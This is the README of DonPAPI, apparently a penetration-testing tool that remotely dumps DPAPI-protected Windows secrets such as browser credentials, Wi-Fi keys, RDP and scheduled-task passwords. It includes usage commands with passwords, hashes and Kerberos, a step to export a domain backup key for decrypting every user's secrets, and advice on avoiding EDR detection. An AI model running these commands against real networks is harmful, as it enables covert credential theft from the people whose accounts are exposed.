# DonPAPI
Dumping revelant information on compromised targets without AV detection

## DPAPI dumping
Lots of credentials are protected by [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection).

We aim at locating those "secured" credentials, and retreive them using :
- User password
- Domaine DPAPI BackupKey
- Local machine DPAPI Key (protecting `TaskScheduled` blob)

## Curently gathered info
- Windows credentials (Taskscheduled credentials & a lot more)
- Windows Vaults
- Windows RDP credentials 
- AdConnect (still require a manual operation)
- Wifi key
- Intenet explorer Creentials
- Chrome cookies & credentials
- Firefox cookies & credentials 
- VNC passwords
- mRemoteNG password (with default config)

## Check for a bit of compliance
- SMB signing status
- OS/Domain/Hostname/Ip of the audited scope

## Operational use

With local admin account on a host, we can :
- Gather machine protected DPAPI secrets
  - ScheduledTask that will contain cleartext login/password of the account configured to run the task
  - Wi-Fi passwords
- Extract Masterkey's hash value for every user profiles (masterkeys beeing protected by the user's password, let's try to crack them with Hashcat)
- Identify who is connected from where, in order to identify admin's personal computers. 
- Extract other non-dpapi protected secrets (VNC/Firefox/mRemoteNG)
- Gather protected secrets from IE, Chrome, Firefox and start reaching the Azure tenant.

With a user password, or the domain PVK we can unprotect the user's DPAPI secrets.  

## Examples

Dump all secrets of the target machine with an admin account : 

```bash
DonPAPI.py domain/user:passw0rd@target
```

Using user's hash

```bash
DonPAPI.py --hashes <LM>:<NT> domain/user@target
```

Using kerberos (-k) and local auth (-local_auth)

```bash
DonPAPI.py -k domain/user@target
DonPAPI.py -local_auth user@target
```

Using a user with LAPS password reading rights

```bash
DonPAPI.py -laps domain/user:passw0rd@target
```

It is also possible to provide the tool with a list of credentials that will be tested on the target. DonPAPI will try to use them to decipher masterkeys.

This credential file must have the following syntax:

```plain
user1:pass1
user2:pass2
...
```

```bash
DonPAPI.py -credz credz_file.txt domain/user:passw0rd@target
```

When a domain admin user is available, it is possible to dump the domain backup key using impacket `dpapi.py` tool. 

```bash
dpapi.py backupkey --export
```

This backup key can then be used to dump all domain user's secrets!

`python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list`

Target can be an IP, IP range, CIDR, file containing list targets (one per line)


## Opsec consideration
The RemoteOps part can be spoted by some EDR. It can be disabled using `--no_remoteops` flag, but then the machine DPAPI key won't be retrieved, and scheduled task credentials/Wi-Fi passwords won't be harvested. 

## Installation 
```
git clone https://github.com/login-securite/DonPAPI.git
cd DonPAPI
python3 -m pip install -r requirements.txt
python3 DonPAPI.py
```

## Credits
All the credits goes to these great guys for doing the hard research & coding : 
- Benjamin Delpy ([@gentilkiwi](https://twitter.com/gentilkiwi)) for most of the DPAPI research (always greatly commented, <3 your code)
- Alberto Solino ([@agsolino](https://twitter.com/agsolino)) for the tremendous work of Impacket (https://github.com/SecureAuthCorp/impacket). Almost everything we do here comes from impacket. 
- [Alesandro Z](https://github.com/AlessandroZ) & everyone who worked on Lazagne (https://github.com/AlessandroZ/LaZagne/wiki) for the VNC & Firefox modules, and most likely for a lots of other ones in the futur. 
- dirkjanm [@_dirkjan](https://twitter.com/_dirkjan) for the base code of adconnect dump (https://github.com/fox-it/adconnectdump) & every research he ever did. I learned so much on so many subjects thanks to you. <3
- [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) for CME (lots of inspiration and code comes from CME : https://github.com/byt3bl33d3r/CrackMapExec )
- All the Team at [@LoginSecurite](https://twitter.com/LoginSecurite) for their help in debugging my shity code (special thanks to [@layno](https://github.com/clayno) & [@HackAndDo](https://twitter.com/HackAndDo) for that)

## Todo
- Dinish ADSync/ADConnect password extraction
- CREDHISTORY full extraction
- Extract windows Certificates
- Further analysis ADAL/msteams
- Omplement Chrome <v80 decoder
- Find a way to implement Lazagne's great modules

# Changelog

  ```
  v1.0
  ----
  Initial release
  ```
